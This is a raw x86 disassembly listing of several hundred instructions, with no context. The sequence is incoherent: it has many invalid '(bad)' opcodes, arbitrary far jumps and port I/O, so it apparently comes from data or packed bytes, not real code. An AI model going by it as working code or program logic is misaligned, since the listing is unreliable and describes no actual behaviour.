  411fb6:	mov    ebp,0xd4eb7926
  411fbb:	sub    BYTE PTR [edx+eiz*1+0x2feb67f6],0xe2
  411fc3:	mov    ecx,0xed84e511
  411fc8:	test   BYTE PTR [ecx+ebx*4-0x2889530a],dh
  411fcf:	xchg   edi,eax
  411fd0:	call   DWORD PTR [ecx]
  411fd2:	das    
  411fd3:	jns    0x411f5d
  411fd5:	out    dx,eax
  411fd6:	cdq    
  411fd7:	jbe    0x411f87
  411fd9:	xor    eax,0xe477104f
  411fde:	mov    ds:0xe7b2eb5b,eax
  411fe3:	aad    0x8c
  411fe5:	adc    DWORD PTR ds:[ecx],ecx
  411fe8:	jg     0x411fd6
  411fea:	push   esi
  411feb:	stos   BYTE PTR es:[edi],al
  411fec:	inc    edi
  411fed:	sti    
  411fee:	mov    bl,0x25
  411ff0:	das    
  411ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ff2:	mov    cl,0x36
  411ff4:	xor    al,0xca
  411ff6:	add    al,BYTE PTR ds:0x151fdbbe
  411ffc:	dec    ecx
  411ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ffe:	jnp    0x411fe5
  412000:	sbb    al,0x26
  412002:	cmp    DWORD PTR [edi+0x77],ebx
  412005:	cmp    al,0x72
  412007:	xchg   edx,eax
  412008:	xchg   ecx,eax
  412009:	xor    eax,0xea39b864
  41200e:	or     BYTE PTR [esi-0x6e90a40],dl
  412014:	inc    ecx
  412015:	dec    ecx
  412016:	nop
  412017:	adc    DWORD PTR [edi+0x6f49225d],esp
  41201d:	jnp    0x412040
  41201f:	jo     0x412017
  412021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412022:	dec    ebp
  412023:	adc    eax,0x639d5dac
  412028:	shr    dl,1
  41202a:	leave  
  41202b:	les    ebx,FWORD PTR [ecx]
  41202d:	mov    bh,0x48
  41202f:	ss test al,0x7d
  412032:	push   ebx
  412033:	das    
  412034:	test   BYTE PTR [esi-0x20992b22],cl
  41203a:	sti    
  41203b:	lock cmp eax,0x4b859803
  412041:	sbb    BYTE PTR [ecx],dh
  412043:	mov    al,BYTE PTR [ebx]
  412045:	mov    bh,BYTE PTR [ebx]
  412047:	out    0x6c,al
  412049:	lock dec edi
  41204b:	inc    edx
  41204c:	jmp    0x411ff6
  41204e:	daa    
  41204f:	pushf  
  412050:	call   0x41069bae
  412055:	sbb    BYTE PTR [edi],bh
  412057:	mov    esi,0x6cf93121
  41205c:	imul   eax,DWORD PTR [edx-0x62e49132],0xc3ebc717
  412066:	lock dec edx
  412068:	js     0x412094
  41206a:	adc    eax,0x8edfeea4
  41206f:	sti    
  412070:	jmp    0x2912:0x25a6000d
  412077:	(bad)  
  412078:	ror    ebp,1
  41207a:	fwait
  41207b:	xchg   ecx,eax
  41207c:	aaa    
  41207d:	add    bh,BYTE PTR [esi-0xc]
  412080:	cmp    al,0xff
  412082:	xchg   DWORD PTR [ebp-0x7f834d2a],ebx
  412088:	push   es
  412089:	mov    al,ds:0x851c5436
  41208e:	dec    edx
  41208f:	mov    ds:0xc4f4c1e0,al
  412094:	mov    ebp,0x46913fc2
  412099:	or     edx,DWORD PTR [edx]
  41209b:	loop   0x412093
  41209d:	jecxz  0x412074
  41209f:	(bad)  
  4120a0:	mov    edx,0x6d173265
  4120a5:	xchg   edi,eax
  4120a6:	pushf  
  4120a7:	cs loop 0x412122
  4120aa:	pop    ss
  4120ab:	and    BYTE PTR ds:0x198f5849,bh
  4120b1:	fisub  DWORD PTR [edx+0x7ab05731]
  4120b7:	sbb    al,al
  4120b9:	ja     0x4120dd
  4120bb:	jns    0x412044
  4120bd:	push   edi
  4120be:	and    cl,BYTE PTR [eax]
  4120c0:	adc    BYTE PTR [eax-0x2027a444],bh
  4120c6:	scas   eax,DWORD PTR es:[edi]
  4120c7:	mov    edx,0x95b14ebd
  4120cc:	push   es
  4120cd:	data16 jbe 0x412104
  4120d0:	imul   esp,DWORD PTR [ecx+0x9ab4b6c],0x4e
  4120d7:	cwde   
  4120d8:	out    0x3,eax
  4120da:	adc    al,0x2b
  4120dc:	aas    
  4120dd:	call   0x488f:0x80eb664c
  4120e4:	mov    al,ds:0x328615a5
  4120e9:	pop    di
  4120eb:	(bad)  
  4120ec:	fadd   QWORD PTR [eax+eax*1]
  4120ef:	ret    
  4120f0:	mov    edx,0x85563b35
  4120f5:	ss jge 0x4120a6
  4120f8:	sub    eax,0x622a0ca2
  4120fd:	pop    es
  4120fe:	pusha  
  4120ff:	or     al,BYTE PTR [ecx+esi*2+0x7fd5b103]
  412106:	stc    
  412107:	push   0x27
  412109:	aam    0xd2
  41210b:	popf   
  41210c:	or     esi,DWORD PTR [edi]
  41210e:	(bad)
  412111:	mov    edx,0x693a940e
  412116:	push   0x5b049880
  41211b:	pop    ds
  41211c:	clc    
  41211d:	jecxz  0x4120de
  41211f:	out    dx,eax
  412120:	aas    
  412121:	je     0x4120e6
  412123:	(bad)  
  412124:	gs enter 0xb208,0xcf
  412129:	bound  ebp,QWORD PTR cs:[ebx-0x3d]
  41212d:	fistp  DWORD PTR [eax+0x37]
  412130:	into   
  412131:	fmul   QWORD PTR [edi-0x22]
  412134:	sbb    eax,0x923ece11
  412139:	pushf  
  41213a:	or     eax,0xea316a7b
  41213f:	cmp    DWORD PTR [ebp-0x4a],esi
  412142:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412143:	push   edx
  412144:	push   eax
  412145:	fist   DWORD PTR [edi+0x1f932260]
  41214b:	pusha  
  41214c:	or     bl,BYTE PTR [edi]
  41214e:	cdq    
  41214f:	popa   
  412150:	xchg   BYTE PTR [ebp-0x3791a0ef],ah
  412156:	dec    ecx
  412157:	call   0xc2f687ab
  41215c:	jmp    0x412172
  41215e:	pop    edx
  41215f:	inc    esp
  412160:	mov    dh,0xd
  412162:	xchg   ebx,esi
  412164:	dec    esi
  412165:	pop    esi
  412166:	cmp    DWORD PTR [ecx+0x75],ecx
  412169:	sahf   
  41216a:	rcr    BYTE PTR [edi-0x79f2b19e],cl
  412170:	in     al,0xed
  412172:	repz cs in eax,0xfd
  412176:	xor    edx,eax
  412178:	fmul   DWORD PTR [ecx-0xc]
  41217b:	cmp    DWORD PTR [ecx+0x412c7fc5],0xffffff92
  412182:	inc    ebp
  412183:	pop    ecx
  412184:	mov    ch,bh
  412186:	std    
  412187:	ror    DWORD PTR [ecx+0x39],1
  41218a:	pushf  
  41218b:	es sbb eax,0x827f1c97
  412191:	sbb    esi,DWORD PTR [ebx+0x1377d72b]
  412197:	jmp    0xc39c:0x1925401a
  41219e:	loope  0x4121a8
  4121a0:	or     BYTE PTR [eax-0x73],ah
  4121a3:	cmp    ebx,ecx
  4121a5:	sub    eax,0xb74ff5ff
  4121aa:	jl     0x4121db
  4121ac:	scas   eax,DWORD PTR es:[edi]
  4121ad:	xor    BYTE PTR [ebp-0x1ae098b2],0xf5
  4121b4:	bound  esi,QWORD PTR [eax+0x49]
  4121b7:	and    al,0x95
  4121b9:	ja     0x4121e0
  4121bb:	jo     0x412221
  4121bd:	xchg   ecx,eax
  4121be:	jge    0x4121a8
  4121c0:	pop    edx
  4121c1:	mov    ch,0x63
  4121c3:	sahf   
  4121c4:	lods   eax,DWORD PTR ds:[esi]
  4121c5:	mov    ecx,0x1dbffa85
  4121ca:	push   ebx
  4121cb:	outs   dx,BYTE PTR ds:[esi]
  4121cc:	scas   al,BYTE PTR es:[edi]
  4121cd:	xchg   ecx,eax
  4121ce:	sbb    al,0x8f
  4121d0:	mov    DWORD PTR [esi-0x34270dd5],ebx
  4121d6:	out    dx,al
  4121d7:	imul   ebx,DWORD PTR [esi+0x42],0x88fe92bb
  4121de:	je     0x41216c
  4121e0:	jb     0x4121ff
  4121e2:	mov    DWORD PTR [edx+0x40],esi
  4121e5:	call   0x3559:0x862f23b2
  4121ec:	push   edi
  4121ed:	imul   ecx,DWORD PTR [ebp-0xa324c5d],0x7f
  4121f4:	gs aam 0xf7
  4121f7:	scas   eax,DWORD PTR es:[edi]
  4121f8:	or     eax,0x7ce98268
  4121fd:	repnz ss and esp,edi
  412201:	jbe    0x41218d
  412203:	adc    al,0x4e
  412205:	adc    BYTE PTR [ecx+0xf],bl
  412208:	rcr    BYTE PTR [ecx-0x30],cl
  41220b:	cmp    eax,0xa45c9a50
  412210:	dec    edi
  412211:	jno    0x41226f
  412213:	push   esp
  412214:	cmp    eax,0xc07a5af8
  412219:	scas   eax,DWORD PTR es:[edi]
  41221a:	mov    al,0x4d
  41221c:	jo     0x4121ba
  41221e:	cmp    esi,DWORD PTR [ecx+0x1c86f4ef]
  412224:	retf   0x76f
  412227:	push   0x21ed4ded
  41222c:	test   DWORD PTR [eax+0x6f187a0e],esp
  412232:	inc    esi
  412233:	arpl   WORD PTR [ebx+ecx*1],sp
  412236:	stc    
  412237:	mov    edi,0x88830c80
  41223c:	sub    BYTE PTR [ebx+0x3fdef11d],0x6
  412243:	push   edx
  412244:	push   edi
  412245:	popf   
  412246:	daa    
  412247:	mov    bl,0xaf
  412249:	sbb    esi,DWORD PTR [edx]
  41224b:	aad    0xc7
  41224d:	test   eax,0x42e4a718
  412252:	lahf   
  412253:	jl     0x412243
  412255:	adc    BYTE PTR ds:0x9ede0c02,cl
  41225b:	pop    esp
  41225c:	jl     0x41229d
  41225e:	(bad)  
  41225f:	and    esp,DWORD PTR [eax-0x7e]
  412262:	sti    
  412263:	cmp    eax,0xd33e5175
  412268:	dec    ebp
  412269:	jmp    0x2d6c:0xf4dd19f3
  412270:	outs   dx,DWORD PTR ds:[esi]
  412271:	xor    eax,0x49b67c3f
  412276:	jb     0x41221a
  412278:	loop   0x4122b5
  41227a:	mov    edx,0x35ed9d40
  41227f:	aas    
  412280:	cmp    al,0x3d
  412282:	sbb    dl,BYTE PTR [edi-0x3b]
  412285:	fcom   QWORD PTR [ecx-0x80]
  412288:	xchg   ebp,eax
  412289:	adc    dh,cl
  41228b:	sub    DWORD PTR [esi-0x7329f9eb],ebx
  412291:	mov    WORD PTR [edi],ds
  412293:	outs   dx,BYTE PTR ds:[esi]
  412294:	and    al,0x5c
  412296:	lds    ebp,FWORD PTR [esi]
  412298:	out    dx,eax
  412299:	jae    0x4122f5
  41229b:	jle    0x412234
  41229d:	stos   DWORD PTR es:[edi],eax
  41229e:	lods   al,BYTE PTR ds:[esi]
  41229f:	aad    0xe
  4122a1:	mov    ch,0xc3
  4122a3:	jmp    0x412246
  4122a5:	stc    
  4122a6:	adc    DWORD PTR [ebp+0x0],ebx
  4122a9:	and    BYTE PTR [ebx-0x3],bh
  4122ac:	lods   al,BYTE PTR ds:[esi]
  4122ad:	fwait
  4122ae:	or     al,BYTE PTR [eax+eax*4-0x54576def]
  4122b5:	jg     0x4122c4
  4122b7:	inc    ebx
  4122b8:	lds    ebp,FWORD PTR [edi+0x1a]
  4122bb:	aad    0x9e
  4122bd:	jb     0x412256
  4122bf:	sbb    eax,0x3810955a
  4122c4:	inc    ebx
  4122c5:	xor    esp,DWORD PTR [ebx-0x1a4402e2]
  4122cb:	pop    eax
  4122cc:	mov    bh,0x3c
  4122ce:	test   DWORD PTR [ebx-0x39],ebp
  4122d1:	push   edx
  4122d2:	rcl    BYTE PTR [eax+0x6],1
  4122d5:	cli    
  4122d6:	inc    esp
  4122d7:	sbb    eax,0xe1e4b9b4
  4122dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122dd:	(bad)  
  4122de:	out    0x96,al
  4122e0:	arpl   WORD PTR [edx-0x75ba828a],bp
  4122e6:	or     al,0x6
  4122e8:	rol    BYTE PTR ds:0x36881b0,0xe1
  4122ef:	inc    eax
  4122f0:	cmp    ch,ch
  4122f2:	shl    DWORD PTR [ebp+0x6c],cl
  4122f5:	lods   eax,DWORD PTR ds:[esi]
  4122f6:	xchg   esi,eax
  4122f7:	adc    bl,dl
  4122f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122fa:	mov    cl,0x62
  4122fc:	ficomp DWORD PTR [eax-0x18]
  4122ff:	mov    ds:0x28e864c,eax
  412304:	or     bl,ch
  412306:	in     al,dx
  412307:	ror    ah,0x1e
  41230a:	add    DWORD PTR ds:0x9bb813fa,0x69aa071c
  412314:	xchg   esi,eax
  412315:	inc    ebx
  412316:	inc    ebp
  412317:	jo     0x4122e2
  412319:	xchg   BYTE PTR [ecx+ebp*2-0x59],cl
  41231d:	add    eax,0x4942c65f
  412322:	sub    edi,DWORD PTR [edx+0x500da111]
  412328:	pop    esp
  412329:	and    edi,0x17
  41232c:	outs   dx,BYTE PTR ds:[esi]
  41232d:	inc    esp
  41232e:	outs   dx,BYTE PTR ds:[esi]
  41232f:	aaa    
  412330:	std    
  412331:	adc    ah,BYTE PTR [esi-0x33b9078c]
  412337:	jmp    0x65f2:0x8853b70f
  41233e:	and    ecx,DWORD PTR [eax+eax*4+0x73]
  412342:	(bad)  
  412343:	std    
  412344:	mov    edx,fs
  412346:	xchg   esi,eax
  412347:	lods   al,BYTE PTR ds:[esi]
  412348:	sub    eax,0xb574801
  41234d:	inc    ebp
  41234e:	inc    ebp
  41234f:	adc    al,0x17
  412351:	pop    esp
  412352:	jae    0x412358
  412354:	stos   DWORD PTR es:[edi],eax
  412355:	call   DWORD PTR ds:0x23ecf2aa
  41235b:	mov    eax,0x6d3aee4f
  412360:	pop    esp
  412361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412362:	in     eax,dx
  412363:	dec    eax
  412364:	inc    edx
  412365:	cmp    BYTE PTR [esi],dl
  412367:	add    al,0x15
  412369:	cdq    
  41236a:	ret    0x8697
  41236d:	int3   
  41236e:	dec    ebx
  41236f:	fidiv  WORD PTR [eax+ebp*1+0x7372e7d4]
  412376:	xchg   esi,eax
  412377:	and    eax,0x9fc0fd27
  41237c:	mov    DWORD PTR [edi-0x72],edi
  41237f:	in     al,0x8f
  412381:	xor    al,0x4
  412383:	sbb    bl,ch
  412385:	(bad)  
  412386:	lods   al,BYTE PTR ds:[esi]
  412387:	adc    eax,ebx
  412389:	pop    edi
  41238a:	enter  0xb395,0xb6
  41238e:	jg     0x41237b
  412390:	jmp    0x9bc4773d
  412395:	xor    ecx,DWORD PTR [edi+0x6e72fc1e]
  41239b:	add    eax,0x8b73acf9
  4123a0:	in     eax,0xcf
  4123a2:	inc    ecx
  4123a3:	popf   
  4123a4:	lods   eax,DWORD PTR ds:[esi]
  4123a5:	dec    edx
  4123a6:	je     0x4123f5
  4123a8:	jmp    0x1749:0x5121d42a
  4123af:	imul   ebp,DWORD PTR [ecx+0x59],0x14
  4123b3:	das    
  4123b4:	dec    edi
  4123b5:	je     0x412410
  4123b7:	push   edi
  4123b8:	js     0x4123ca
  4123ba:	aam    0xcf
  4123bc:	cmp    BYTE PTR [ecx+edx*1+0x3fa2c05c],bl
  4123c3:	cmp    ah,BYTE PTR [edi+ebx*4-0xc]
  4123c7:	into   
  4123c8:	pop    es
  4123c9:	jmp    0x4123c9
  4123cb:	shl    DWORD PTR [edx],1
  4123cd:	pop    esp
  4123ce:	adc    BYTE PTR [edx],ah
  4123d0:	call   FWORD PTR [edx]
  4123d2:	cmc    
  4123d3:	int3   
  4123d4:	(bad)  
  4123d5:	jge    0x412364
  4123d7:	add    eax,0xcce4bab9
  4123dc:	out    dx,al
  4123dd:	pmulhuw mm1,QWORD PTR [esi-0x15]
  4123e1:	adc    DWORD PTR [ebx],ebp
  4123e3:	sub    edi,eax
  4123e5:	(bad)  
  4123e6:	dec    edx
  4123e7:	push   ecx
  4123e8:	pop    eax
  4123e9:	cmp    bl,dl
  4123eb:	fsub   DWORD PTR [edi]
  4123ed:	or     ah,al
  4123ef:	mov    bh,0x83
  4123f1:	jae    0x412472
  4123f3:	data16 fbld TBYTE PTR ds:0xde112198
  4123fa:	sub    al,0x30
  4123fc:	jg     0x412472
  4123fe:	shl    BYTE PTR [edi+ecx*2],0xaa
  412402:	sahf   
  412403:	xor    ah,BYTE PTR [ebx-0x1b596823]
  412409:	int    0x94
  41240b:	fistp  WORD PTR [ecx-0x5290689a]
  412411:	int3   
  412412:	xlat   BYTE PTR ds:[ebx]
  412413:	push   ebp
  412414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412415:	shl    DWORD PTR [eax],0xdd
  412418:	or     ch,bl
  41241a:	loopne 0x412459
  41241c:	jnp    0x412403
  41241e:	call   0x40a8fd6e
  412423:	or     eax,0x98336c02
  412428:	sti    
  412429:	and    eax,DWORD PTR ds:0x91570b90
  41242f:	std    
  412430:	dec    ebp
  412431:	lds    edi,FWORD PTR [esi]
  412433:	(bad)  
  412434:	mov    ah,0xb1
  412436:	pop    eax
  412437:	fcmovnu st,st(5)
  412439:	cmp    esp,edx
  41243b:	retf   0xc
  41243e:	or     eax,0x4f5fc3cb
  412443:	nop
  412444:	pop    esi
  412445:	imul   edi,DWORD PTR [eax-0x1b2e71ef],0xffffffa1
  41244c:	sbb    BYTE PTR [edi-0x3c],0xf9
  412450:	jp     0x4124aa
  412452:	dec    BYTE PTR [edx-0xc]
  412455:	stos   DWORD PTR es:[edi],eax
  412456:	dec    edx
  412457:	push   ecx
  412458:	(bad)  
  412459:	mov    edx,0x2b8dd889
  41245e:	jbe    0x412442
  412460:	jecxz  0x4123f3
  412462:	inc    eax
  412463:	lahf   
  412464:	push   ds
  412465:	iret   
  412466:	in     eax,0xbd
  412468:	inc    ebx
  412469:	jne    0x412438
  41246b:	lahf   
  41246c:	in     eax,0x3d
  41246e:	repz add esi,eax
  412471:	mov    dh,0x52
  412473:	push   es
  412474:	cmp    al,0x29
  412476:	fistp  WORD PTR [eax+ebp*1]
  412479:	mov    esp,DWORD PTR [edx-0x41d313e8]
  41247f:	ja     0x4124f8
  412481:	in     eax,dx
  412482:	aam    0xc3
  412484:	pop    edi
  412485:	inc    esi
  412486:	sbb    edi,DWORD PTR [ebx+0x6e]
  412489:	pop    ss
  41248a:	inc    edi
  41248b:	and    ch,bh
  41248d:	test   al,0x40
  41248f:	cmp    edx,DWORD PTR [esi-0x46fdab9d]
  412495:	push   ds
  412496:	aaa    
  412497:	jmp    0x41245c
  412499:	pop    edx
  41249a:	cmc    
  41249b:	sub    al,0x87
  41249d:	mov    bh,0xfd
  41249f:	outs   dx,BYTE PTR ds:[esi]
  4124a0:	shl    DWORD PTR [esi-0x2],cl
  4124a3:	cmc    
  4124a4:	sub    al,0x65
  4124a6:	sub    DWORD PTR [eax-0x44],esp
  4124a9:	fisttp DWORD PTR [esi]
  4124ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124ac:	lock paddsw mm1,mm4
  4124b0:	out    dx,eax
  4124b1:	imul   ecx,edi,0x64f1e45d
  4124b7:	xor    ebx,DWORD PTR [ebx-0x29]
  4124ba:	fs sbb al,0x3a
  4124bd:	sti    
  4124be:	shl    BYTE PTR [edi+0x670e5e9d],0xeb
  4124c5:	sub    BYTE PTR [edx],al
  4124c7:	cmp    dh,al
  4124c9:	repnz mov ds:0xaa901d8b,eax
  4124cf:	push   edi
  4124d0:	pop    esp
  4124d1:	adc    ch,BYTE PTR [ebx-0x4b]
  4124d4:	mov    ebx,0x272c809e
  4124d9:	div    dl
  4124db:	aam    0xd6
  4124dd:	lods   eax,DWORD PTR ds:[esi]
  4124de:	std    
  4124df:	fimul  WORD PTR [edi]
  4124e1:	test   DWORD PTR [eax],ebx
  4124e3:	mov    BYTE PTR [ebx+0x27],bl
  4124e6:	xchg   edi,eax
  4124e7:	push   edx
  4124e8:	adc    DWORD PTR [ebp-0x6],edi
  4124eb:	xlat   BYTE PTR ds:[ebx]
  4124ec:	clc    
  4124ed:	push   ds
  4124ee:	push   ecx
  4124ef:	icebp  
  4124f0:	bound  ecx,QWORD PTR [edx-0x44d24136]
  4124f6:	daa    
  4124f7:	push   esi
  4124f8:	mov    eax,ds:0xa0673e7b
  4124fd:	std    
  4124fe:	mov    ds:0xa0b71c3b,al
  412503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412504:	mov    bh,0x89
  412506:	out    0xc,eax
  412508:	lahf   
  412509:	dec    ecx
  41250a:	out    dx,al
  41250b:	xor    al,0x52
  41250d:	int    0x53
  41250f:	or     dh,dl
  412511:	xchg   ebp,eax
  412512:	fcmove st,st(7)
  412514:	clc    
  412515:	xchg   esi,eax
  412516:	jmp    0x6efb:0x51a37c32
  41251d:	push   eax
  41251e:	xchg   ecx,eax
  41251f:	cmp    al,0x15
  412522:	fcmovu st,st(1)
  412524:	jp     0x4124d9
  412526:	aam    0x93
  412528:	stos   DWORD PTR es:[edi],eax
  412529:	push   edi
  41252a:	addr16 inc edi
  41252c:	push   eax
  41252d:	(bad)  
  41252e:	or     DWORD PTR [edx+0x4d405e6d],ecx
  412534:	in     eax,dx
  412535:	out    0x7b,eax
  412537:	das    
  412538:	sti    
  412539:	push   edi
  41253a:	enter  0xd57,0x3
  41253e:	in     al,dx
  41253f:	xchg   ecx,eax
  412540:	mov    edx,0x48b5b004
  412545:	jbe    0x412570
  412547:	outs   dx,BYTE PTR ds:[esi]
  412548:	dec    eax
  412549:	inc    edx
  41254a:	pushf  
  41254b:	in     al,dx
  41254c:	sbb    BYTE PTR ds:0x89fd804,bl
  412552:	es mov esp,0x873c66bf
  412558:	push   ebp
  412559:	ins    DWORD PTR es:[edi],dx
  41255a:	cmp    edx,DWORD PTR [ebp-0x54]
  41255d:	ins    DWORD PTR es:[edi],dx
  41255e:	in     al,0x5c
  412560:	enter  0x45c9,0x2c
  412564:	sub    BYTE PTR [edx-0x23],0x40
  412568:	inc    eax
  412569:	xchg   edx,eax
  41256a:	retf   
  41256b:	mov    WORD PTR [esi+0x70],?
  41256e:	into   
  41256f:	xor    eax,0xe8ed20c5
  412574:	mov    eax,ds:0x74f1ffe6
  412579:	dec    ebp
  41257a:	sub    BYTE PTR [esp+ebp*2],bh
  41257d:	inc    ebp
  41257e:	(bad)  
  41257f:	jo     0x4125e5
  412581:	mov    eax,ds:0x31415e35
  412586:	cmp    edi,esi
  412588:	dec    esp
  412589:	mov    dl,0xd8
  41258b:	(bad)  
  41258c:	xchg   ebp,eax
  41258d:	lea    esi,[edx+0x4c591f69]
  412593:	popa   
  412594:	int3   
  412595:	xchg   DWORD PTR [esi-0x39],esp
  412598:	scas   eax,DWORD PTR es:[edi]
  412599:	cmp    eax,0x2ef6482b
  41259e:	sub    cl,BYTE PTR [ebx+ebx*4+0x39f567cc]
  4125a5:	xor    al,0x61
  4125a7:	xchg   ebp,eax
  4125a8:	shr    DWORD PTR [ebx+0xd804521],1
  4125ae:	out    dx,al
  4125af:	div    BYTE PTR [edx]
  4125b1:	scas   al,BYTE PTR es:[edi]
  4125b2:	jae    0x41255c
  4125b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125b5:	xor    bh,BYTE PTR ds:0x4e89229
  4125bb:	inc    edi
  4125bc:	and    DWORD PTR [ecx],ebp
  4125be:	jo     0x412602
  4125c0:	loope  0x41257c
  4125c2:	fisubr DWORD PTR [eax+ecx*2+0x2d7d921f]
  4125c9:	pop    edi
  4125ca:	lds    edx,FWORD PTR [esi-0x4b]
  4125cd:	push   ss
  4125ce:	(bad)  
  4125cf:	lock adc bh,BYTE PTR [edx+0x1a]
  4125d3:	mov    bh,0x95
  4125d5:	scas   eax,DWORD PTR es:[edi]
  4125d6:	mov    eax,ds:0xe1d7eedf
  4125db:	hlt    
  4125dc:	inc    ebx
  4125dd:	mov    ecx,0xd9a071ae
  4125e2:	test   DWORD PTR [ebp+0x70793fce],eax
  4125e8:	pusha  
  4125e9:	scas   al,BYTE PTR es:[edi]
  4125ea:	psubd  mm7,QWORD PTR [esi+0x60aa990]
  4125f1:	jnp    0x412584
  4125f3:	sub    ebp,DWORD PTR [ebx]
  4125f5:	aas    
  4125f6:	mov    ebx,0xe4ce5231
  4125fb:	dec    edx
  4125fc:	iret   
  4125fd:	xchg   edx,eax
  4125fe:	and    BYTE PTR [ebx+0x43],0x25
  412602:	and    eax,0x7f6c77d9
  412607:	mov    eax,0xedfa98a
  41260c:	sti    
  41260d:	hlt    
  41260e:	xor    ebx,ebx
  412610:	lea    edi,[ecx-0x17c113f7]
  412616:	push   ecx
  412617:	sub    DWORD PTR [ebx],edx
  412619:	mov    edx,0x4cf8c058
  41261e:	jmp    0x7f3eea73
  412623:	rcl    DWORD PTR [ecx+edx*8-0x6e537ac5],cl
  41262a:	fisubr WORD PTR [edx-0x7c19193a]
  412630:	xchg   ecx,eax
  412631:	pop    DWORD PTR [esi]
  412633:	lock and ebx,ecx
  412636:	sub    al,0xf1
  412638:	xlat   BYTE PTR ds:[ebx]
  412639:	std    
  41263a:	or     BYTE PTR ds:0xf70b09ed,bh
  412640:	int    0x7b
  412642:	adc    esi,eax
  412644:	xchg   edx,eax
  412645:	push   0xdd3f3a4c
  41264a:	dec    esi
  41264b:	dec    eax
  41264c:	fwait
  41264d:	test   ah,bh
  41264f:	test   al,0xc1
  412651:	jne    0x412664
  412653:	das    
  412654:	dec    esp
  412656:	jnp    0x412667
  412658:	dec    ebp
  412659:	repnz cmp al,0xe8
  41265c:	test   eax,0x5752fe8e
  412661:	xchg   esp,eax
  412662:	jmp    0xf4b23569
  412667:	data16 add ch,dl
  41266a:	xchg   ebp,esp
  41266c:	pop    ds
  41266d:	inc    edi
  41266e:	in     eax,0x95
  412670:	add    esi,DWORD PTR [ebx+0x19]
  412673:	or     al,0xc9
  412675:	rol    BYTE PTR [ecx+0x4b],0x57
  412679:	(bad)  
  41267a:	(bad)  
  41267b:	dec    esi
  41267c:	and    cl,BYTE PTR [eax+0x79557422]
  412682:	in     al,dx
  412683:	test   BYTE PTR [esi+0x4742e4cd],bh
  412689:	call   0x1967a87a
  41268e:	xor    BYTE PTR [ebx-0x67d6f9c7],dl
  412694:	mov    DWORD PTR [ebx+0x72],ecx
  412697:	xchg   ebx,eax
  412698:	sub    BYTE PTR [ebp+edx*2-0x6e],cl
  41269c:	call   0x8e1b:0x6e269a1d
  4126a3:	jo     0x4126c5
  4126a5:	mov    ds:0x809b4b77,eax
  4126aa:	ret    
  4126ab:	push   esi
  4126ac:	cmp    DWORD PTR [esi],0x2c79236a
  4126b2:	mov    ah,0xf3
  4126b4:	outs   dx,BYTE PTR ds:[esi]
  4126b5:	sub    dh,BYTE PTR [eax+0x11b86ace]
  4126bb:	mov    edi,0xd053fdc5
  4126c0:	div    DWORD PTR [edx+0x2c]
  4126c3:	out    dx,eax
  4126c4:	sar    ebp,0xe8
  4126c7:	jecxz  0x412694
  4126c9:	push   esi
  4126ca:	xchg   esp,eax
  4126cb:	stos   BYTE PTR es:[edi],al
  4126cc:	sub    eax,0xdecde115
  4126d1:	inc    ecx
  4126d2:	jne    0x41271a
  4126d4:	push   eax
  4126d5:	cmp    DWORD PTR [esi+0x55],0x6a
  4126d9:	pop    ss
  4126da:	sahf   
  4126db:	xchg   ebp,eax
  4126dc:	mov    ecx,0xdb0a06ad
  4126e1:	jl     0x41273e
  4126e3:	xlat   BYTE PTR ds:[ebx]
  4126e4:	out    dx,eax
  4126e5:	pop    edi
  4126e6:	cmp    al,0x24
  4126e8:	scas   eax,DWORD PTR es:[edi]
  4126e9:	push   ds
  4126ea:	outs   dx,BYTE PTR ds:[esi]
  4126eb:	mov    al,0xab
  4126ed:	clc    
  4126ee:	pushf  
  4126ef:	out    dx,al
  4126f0:	sub    eax,0xe570c67c
  4126f5:	mov    DWORD PTR fs:[edi+edx*2+0x2b],esi
  4126fa:	pop    es
  4126fb:	stc    
  4126fc:	jbe    0x4126d6
  4126fe:	cwd    
  412700:	loope  0x4126fc
  412702:	aam    0x3c
  412704:	or     BYTE PTR [esi],bh
  412706:	cli    
  412707:	jne    0x4126d5
  412709:	mov    eax,0x4c2ea3b6
  41270e:	in     al,0x55
  412710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412711:	xchg   edx,eax
  412712:	mov    eax,0xe474586
  412717:	rol    DWORD PTR [edx+ebx*1],cl
  41271a:	daa    
  41271b:	pushf  
  41271c:	jae    0x412750
  41271e:	aas    
  41271f:	push   ecx
  412720:	adc    al,0x2f
  412722:	mov    edi,DWORD PTR [eax]
  412724:	mov    edi,DWORD PTR [ecx]
  412726:	cdq    
  412727:	(bad)  
  412728:	jns    0x4126e2
  41272a:	inc    ebp
  41272b:	repz xchg esi,eax
  41272d:	addr16 into 
  41272f:	mov    ah,0x76
  412731:	fimul  WORD PTR [ecx+0x456f77a0]
  412737:	fimul  WORD PTR [ebx]
  412739:	push   ecx
  41273a:	mov    eax,ds
  41273c:	mov    al,ds:0x829272f4
  412741:	jb     0x4127a2
  412743:	xor    al,0xde
  412745:	into   
  412746:	enter  0x281f,0xfa
  41274a:	dec    ebx
  41274b:	fcom   QWORD PTR [edx]
  41274d:	repnz sbb bh,bl
  412750:	bound  ebp,QWORD PTR [ebx]
  412752:	das    
  412753:	lds    edi,FWORD PTR [esi-0x3c]
  412756:	aas    
  412757:	xchg   esi,eax
  412758:	mov    ebp,0x9625d537
  41275d:	pop    ds
  41275e:	mov    WORD PTR [ebp-0x5c21bc50],cs
  412764:	jmp    0x9c84:0xa6b07300
  41276b:	xchg   edx,eax
  41276c:	lock push ebp
  41276e:	in     al,dx
  41276f:	mov    al,ds:0x2277a563
  412774:	stos   BYTE PTR es:[edi],al
  412775:	out    dx,eax
  412776:	pop    es
  412777:	imul   ecx,DWORD PTR [esi],0x49
  41277a:	push   eax
  41277b:	loop   0x412701
  41277d:	pop    ebx
  41277e:	pop    esi
  41277f:	and    al,BYTE PTR [eax+ebp*2+0x2d]
  412783:	dec    edx
  412784:	stos   BYTE PTR es:[edi],al
